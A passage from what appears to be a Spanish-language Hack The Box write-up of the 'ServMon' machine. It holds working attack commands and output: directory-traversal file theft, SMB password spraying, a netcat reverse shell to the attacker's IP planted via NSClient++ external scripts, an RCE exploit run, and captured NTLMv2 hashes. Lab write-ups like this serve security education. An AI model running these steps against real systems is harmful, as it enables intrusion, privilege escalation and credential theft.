+        ./nvms.py &lt;TARGET_IP&gt; &lt;TARGET_FILE&gt; <span class="o">[</span>OUT_FILE]
+EXAMPLE:
+        python nvms.py 195.135.100.10 Windows/system.ini win.ini
+</code></pre></div></div>
+
+<p>La herramienta requiere de los parámetros <code class="language-plaintext highlighter-rouge">&lt;TARGET_IP&gt;</code>,  <code class="language-plaintext highlighter-rouge">&lt;TARGET_FILE&gt;</code> y  <code class="language-plaintext highlighter-rouge">[OUT_FILE]</code>; en donde <code class="language-plaintext highlighter-rouge">&lt;TARGET_IP&gt; = 10.10.10.184</code>,  <code class="language-plaintext highlighter-rouge">&lt;TARGET_FILE&gt; = Users/Nathan/Desktop/Passwords.txt</code> y  <code class="language-plaintext highlighter-rouge">[OUT_FILE] = Passwords.txt</code>; así que vamos a ejecutarla.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 nvms.py 10.10.10.184 Windows/system.ini
+<span class="o">[</span>+] DT Attack Succeeded
+<span class="o">[</span>+] File Content
+
+++++++++++ BEGIN ++++++++++
+<span class="p">;</span> <span class="k">for </span>16-bit app support
+<span class="o">[</span>386Enh]
+<span class="nv">woafont</span><span class="o">=</span>dosapp.fon
+EGA80WOA.FON<span class="o">=</span>EGA80WOA.FON
+EGA40WOA.FON<span class="o">=</span>EGA40WOA.FON
+CGA80WOA.FON<span class="o">=</span>CGA80WOA.FON
+CGA40WOA.FON<span class="o">=</span>CGA40WOA.FON
+
+<span class="o">[</span>drivers]
+<span class="nv">wave</span><span class="o">=</span>mmdrv.dll
+<span class="nv">timer</span><span class="o">=</span>timer.drv
+
+<span class="o">[</span>mci]
+
+++++++++++  END  ++++++++++
+❯ python3 nvms.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt Passwords.txt
+<span class="o">[</span>+] DT Attack Succeeded
+<span class="o">[</span>+] Saving File Content
+<span class="o">[</span>+] Saved
+<span class="o">[</span>+] File Content
+
+++++++++++ BEGIN ++++++++++
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5<span class="err">$</span>
+++++++++++  END  ++++++++++
+</code></pre></div></div>
+
+<p>Tenemos unas posibles contraseñas de los usuarios que tenemos y además ya validamos que el usuario <strong>Nathan</strong> existe en el sistema; como vemos el puerto 445 abierto, vamos a probar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.184 <span class="nt">-u</span> <span class="s1">'Nathan'</span> <span class="nt">-p</span> Passwords.txt
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:SERVMON<span class="o">)</span> <span class="o">(</span>domain:ServMon<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>athan:Gr4etN3w5w17hMySk1Pa5<span class="nv">$ </span>STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>Para el usuario <strong>Nathan</strong> no tenemos resultados, pero podríamos probar para <strong>Nadine</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.184 <span class="nt">-u</span> <span class="s1">'Nadine'</span> <span class="nt">-p</span> Passwords.txt
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:SERVMON<span class="o">)</span> <span class="o">(</span>domain:ServMon<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>adine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>adine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>-] ServMon<span class="se">\N</span>adine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
+SMB         10.10.10.184    445    SERVMON          <span class="o">[</span>+] ServMon<span class="se">\N</span>adine:L1k3B1gBut7s@W0rk
+</code></pre></div></div>
+
+<p>Tenemos las credenciales del usuario <strong>Nadine</strong>, por lo que siempre digo, debemos de guardarlas para tenerlas siempre presentes y vamos a probar si podemos conectarnos por ssh:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh nadine@10.10.10.184
+nadine@10.10.10.184<span class="s1">'s password:
+
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine&gt;whoami
+servmon\nadine
+
+nadine@SERVMON C:\Users\Nadine&gt;
+</span></code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora debemos de enumerar un poco el sistema para ver de que forma podemos escalar privielgios.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                          State
+<span class="o">=============================</span> <span class="o">====================================</span> <span class="o">=======</span>
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set       </span>Enabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                 Enabled
+
+nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;
+nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;whoami /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name      SID
+<span class="o">==============</span> <span class="o">=============================================</span>
+servmon<span class="se">\n</span>adine S-1-5-21-3877449121-2587550681-992675040-1002
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                             Type             SID          Attributes
+<span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>ETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\L</span>ocal account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\M</span>edium Mandatory Level Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                          State
+<span class="o">=============================</span> <span class="o">====================================</span> <span class="o">=======</span>
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set       </span>Enabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                 Enabled
+
+
+nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>No vemos nada interesante; sin embargo, debemos recordar que existe el puerto 8443 abierto haciendo mención del servicio <strong>NSClient++</strong>, asi que podríamos echarle un ojo si existe un exploit público.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit NSClient
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                      | json/webapps/48360.txt
+NSClient++ 0.5.2.35 - Privilege Escalation                                                     | windows/local/46802.txt
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Tenemos dos recursos, uno de <strong><em>Authenticated Remote Code Execution</em></strong> y otro de <strong><em>Privilege Escalation</em></strong>, vamos a probar de momento el segundo a ver que nos dice que debemos hacer.</p>
+
+<ul>
+  <li>Nos indica que en la ruta <code class="language-plaintext highlighter-rouge">c:\program files\nsclient++\nsclient.ini</code> podemos identificar una contraseña de administrador del servicio.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;type <span class="s2">"c:</span><span class="se">\p</span><span class="s2">rogram files</span><span class="se">\n</span><span class="s2">sclient++</span><span class="se">\n</span><span class="s2">sclient.ini"</span> | findstr password
+password <span class="o">=</span> ew2x6SsGTxjRwXOT
+
+nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Sin embargo, al logearnos, nos indica un <strong><em>403 Your not allowed</em></strong>.</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web2.png" alt=""></p>
+
+<ul>
+  <li>Esto se debe a que si vemos el archivo de configuración del servicio, indica que el único host permitido es la misma máquina víctima (127.0.0.1).</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine<span class="se">\D</span>esktop&gt;type <span class="s2">"c:</span><span class="se">\p</span><span class="s2">rogram files</span><span class="se">\n</span><span class="s2">sclient++</span><span class="se">\n</span><span class="s2">sclient.ini"</span>
+´╗┐# If you want to fill this file with all available options run the following <span class="nb">command</span>:
+<span class="c">#   nscp settings --generate --add-defaults --load-all</span>
+<span class="c"># If you want to activate a module and bring in all its options use:</span>
+<span class="c">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults </span>
+<span class="c"># For details run: nscp settings --help</span>
+                                                                
+                                
+<span class="p">;</span> <span class="k">in </span>flight - TODO
+<span class="o">[</span>/settings/default]                                                                                                              
+                                
+<span class="p">;</span> Undocumented key
+password <span class="o">=</span> ew2x6SsGTxjRwXOT                                                                                                      
+                                
+<span class="p">;</span> Undocumented key
+allowed hosts <span class="o">=</span> 127.0.0.1
+</code></pre></div></div>
+
+<ul>
+  <li>Por lo tanto, vamos a hace un <strong><em>Local Port Forwarding</em></strong> para tener acceso desde nuestra máquina pero como si lo hicieramos desde la máquina víctima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh <span class="nt">-L</span> 8443:127.0.0.1:8443 nadine@10.10.10.184
+nadine@10.10.10.184<span class="s1">'s password:
+
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine&gt;
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ lsof <span class="nt">-i</span>:8443
+COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+ssh     307287 root    4u  IPv6 920432      0t0  TCP localhost:8443 <span class="o">(</span>LISTEN<span class="o">)</span>
+ssh     307287 root    5u  IPv4 920433      0t0  TCP localhost:8443 <span class="o">(</span>LISTEN<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora si podemos ver el servicio apuntando a nuestra máquina.</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web3.png" alt=""></p>
+
+<ul>
+  <li>De acuerdo con el exploit, debemos habilitar los módulos <strong>CheckExternalScripts</strong> y  <strong>Scheduler</strong>.</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web4.png" alt=""></p>
+
+<p><img src="/assets/images/htb-servmon/servmon-web5.png" alt=""></p>
+
+<ul>
+  <li>Debemos crear un script bajo <strong>Settings &gt; External Scripts &gt; Scripts</strong>
+</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web6.png" alt=""></p>
+
+<ul>
+  <li>Vamos a transferior el archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> y necesitamos crear un archivo de extensión bat que contenga lo siguiente. Ambos archivos los pondremos en la ruta <code class="language-plaintext highlighter-rouge">C:\Temp\</code>:</li>
+</ul>
+
+<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@echo <span class="na">off</span>
+<span class="kd">C</span>:\Temp\nc.exe <span class="m">10</span>.10.14.27 <span class="m">443</span> <span class="na">-e </span><span class="nb">cmd.exe</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nadine@SERVMON C:<span class="se">\T</span>emp&gt;copy <span class="se">\\</span>10.10.14.27<span class="se">\s</span>mbFolder<span class="se">\p</span>rivesc.bat privesc.bat
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+nadine@SERVMON C:<span class="se">\T</span>emp&gt;copy <span class="se">\\</span>10.10.14.27<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe nc.exe
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+nadine@SERVMON C:<span class="se">\T</span>emp&gt;
+nadine@SERVMON C:<span class="se">\T</span>emp&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is DC93-6115
+
+ Directory of C:<span class="se">\T</span>emp
+
+16/01/2022  06:05    &lt;DIR&gt;          <span class="nb">.</span>
+16/01/2022  06:05    &lt;DIR&gt;          ..
+16/01/2022  05:05            28,160 nc.exe
+16/01/2022  04:29                52 privesc.bat
+               2 File<span class="o">(</span>s<span class="o">)</span>         28,212 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   6,099,292,160 bytes free
+
+nadine@SERVMON C:<span class="se">\T</span>emp&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation        
+                                                                
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed                                          
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed                                                                                                           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed                                                                                                           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed                                          
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.184,50180<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>SERVMON<span class="se">\N</span>adine,SERVMON<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SERVMON<span class="se">\N</span>adine authenticated successfully              
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nadine::SERVMON:aaaaaaaaaaaaaaaa:30aec89c753a12e5d36db95e3b3de36c:010100000000000000ec4c74960ad8014d9f3943568f061d00000000010
+010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
+43004f0064005700740065004d000700080000ec4c74960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
+6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
+002e00310034002e00320037000000000000000000  
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>                                    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>   
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>                                 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>                            
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.184,50180<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>                                    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.184,50197<span class="o">)</span>                    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>SERVMON<span class="se">\N</span>adine,SERVMON<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User SERVMON<span class="se">\N</span>adine authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nadine::SERVMON:aaaaaaaaaaaaaaaa:de5c42e3a755709d52bd91fd227ed271:01010000000000008006bd8c960ad8017de9e43c87de19b600000000010
+010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
+43004f0064005700740065004d00070008008006bd8c960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
+6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
+002e00310034002e00320037000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:smbFolder<span class="o">)</span>   
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>SERVMON<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora creamos hacemos click en <strong>Control &gt; Reload</strong> y esperamos a que se restablezca el servicio.</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web7.png" alt=""></p>
+
+<ul>
+  <li>Nos ponemos en escucha por el puerto 443 y dentro del panel de <strong>NSClient++</strong> nos vamos a <strong>Queries</strong> y ya debemos tener nuestra reverse shell, en caso contrario, seleccioanamos nuestro script y le damos en <strong>Run</strong>.</li>
+</ul>
+
+<p><img src="/assets/images/htb-servmon/servmon-web8.png" alt=""></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.184] 49926
+Microsoft Windows <span class="o">[</span>Version 10.0.18363.752]
+<span class="o">(</span>c<span class="o">)</span> 2019 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\P</span>rogram Files<span class="se">\N</span>SClient++&gt;
+</code></pre></div></div>
+
+<p>Ya estamos dentro de la máquina como <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar la flag (root.txt).</p>
+
+<p>Probando el otro exploit que encontramos, nos dice que es un script en python3; por lo tanto lo descargamos en nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> json/webapps/48360.txt
+  Exploit: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/48360
+     Path: /usr/share/exploitdb/exploits/json/webapps/48360.txt
+File Type: Python script, ASCII text executable
+
+Copied to: /home/k4miyo/Documentos/HTB/ServMon/exploits/48360.txt
+
+
+❯ <span class="nb">mv </span>48360.txt nsclient.py
+</code></pre></div></div>
+
+<p>Ahora si lo ejecutamos, vemos que nos pide algunos parámetros.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 nsclient.py
+usage: NSClient++ 0.5.2.35 Authenticated RCE <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-t</span> <span class="o">[</span>target]] <span class="o">[</span><span class="nt">-P</span> <span class="o">[</span>port]] <span class="o">[</span><span class="nt">-p</span> <span class="o">[</span>password]] <span class="o">[</span><span class="nt">-c</span> <span class="o">[</span><span class="nb">command</span><span class="o">]]</span>
+
+optional arguments:
+  <span class="nt">-h</span>, <span class="nt">--help</span>     show this <span class="nb">help </span>message and <span class="nb">exit</span>
+  <span class="nt">-t</span> <span class="o">[</span>target]    Target IP Address.
+  <span class="nt">-P</span> <span class="o">[</span>port]      Target Port.
+  <span class="nt">-p</span> <span class="o">[</span>password]  NSClient++ Administrative Password.
+  <span class="nt">-c</span> <span class="o">[</span><span class="nb">command</span><span class="o">]</span>   Command to execute on target
+</code></pre></div></div>
+
+<p>Ahora, como nos solicita la contraseña; es posible que el script se loguee en el servidor; por lo tanto necesitamos tener nuestro <strong>Local Port Forwarding</strong> y con el parámetro <code class="language-plaintext highlighter-rouge">-c</code> nos dice que recibe comandos para ejecutar a nivel de sistema; esto indica que podríamos subir nuestro archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> a cualquier ruta donde tengamos permisos y con el exploit llamarlo para entablarnos una reverse shell.</p>
+
+<p>En este caso ya tenemos el archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> en <code class="language-plaintext highlighter-rouge">C:\Temp</code>, así que nos ponemos en escucha por el puerto 443 y ejecutamos el exploit:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 nsclient.py <span class="nt">-t</span> 127.0.0.1 <span class="nt">-P</span> 8443 <span class="nt">-p</span> <span class="s2">"ew2x6SsGTxjRwXOT"</span> <span class="nt">-c</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe -e cmd 10.10.14.27 443"</span>
+<span class="o">[!]</span> Targeting base URL https://127.0.0.1:8443
+<span class="o">[!]</span> Obtaining Authentication Token <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[</span>+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
+<span class="o">[!]</span> Enabling External Scripts Module <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[!]</span> Configuring Script with Specified Payload <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[</span>+] Added External Script <span class="o">(</span>name: xdozKLVGdAG<span class="o">)</span>
+<span class="o">[!]</span> Saving Configuration <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[!]</span> Reloading Application <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[!]</span> Waiting <span class="k">for </span>Application to reload <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[!]</span> Obtaining Authentication Token <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[</span>+] Got auth token: frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ
+<span class="o">[!]</span> Triggering payload, should execute shortly <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+<span class="o">[!]</span> Timeout exceeded. Assuming your payload executed <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.184] 50275
+Microsoft Windows <span class="o">[</span>Version 10.0.18363.752]
+<span class="o">(</span>c<span class="o">)</span> 2019 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\P</span>rogram Files<span class="se">\N</span>SClient++&gt;
+</code></pre></div></div>
+
+<p>Y ya obtenemos acceso a la máquina como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#api-fuzzing" class="page__taxonomy-item" rel="tag">API_Fuzzing</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-nest/" class="pagination--pager" title="Hack The Box Nest
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
